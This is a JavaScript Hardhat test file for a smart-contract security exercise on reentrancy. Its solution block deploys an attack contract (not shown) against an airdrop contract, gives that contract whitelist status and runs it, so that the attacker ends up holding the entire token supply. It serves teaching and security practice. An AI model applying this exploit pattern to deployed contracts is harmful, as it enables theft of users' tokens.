const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Reentrancy Exercise 2", function () {
  let deployer, user1, user2, user3, user4, attacker;
  let users;
  const TOTAL_SUPPLY = 50;

  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, user1, user2, user3, user4, attacker] =
      await ethers.getSigners();
    users = [user1, user2, user3, user4, attacker];

    const ApesAirdropFactory = await ethers.getContractFactory(
      "contracts/reentrancy-2/ApesAirdrop.sol:ApesAirdrop",
      deployer
    );

    this.airdrop = await ApesAirdropFactory.deploy();

    await this.airdrop.addToWhitelist(users.map((user) => user.address));

    for (let i = 0; i < users.length; i++) {
      expect(await this.airdrop.isWhitelisted(users[i].address)).to.equal(true);
    }
  });

  it("Exploit", async function () {
    /** CODE YOUR SOLUTION HERE */

    /*Tests.js
- Setup the attackFactory + deploy it (with constructor values, including the target ApesAirdrop addy)
- grantMyWhitelist to the attack contract, from the attacker account (which is on the whitelist)
- Run the attack function, from the attack contract
*/

    const attackFactory = await ethers.getContractFactory(
      "contracts/reentrancy-2/AirdropHack.sol:AirdropHack",
      attacker
    );
    this.attack = await attackFactory.deploy(this.airdrop.address);
    await this.airdrop.connect(attacker).grantMyWhitelist(this.attack.address);
    await this.attack.attack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.airdrop.balanceOf(attacker.address)).to.equal(
      TOTAL_SUPPLY
    );
  });
});
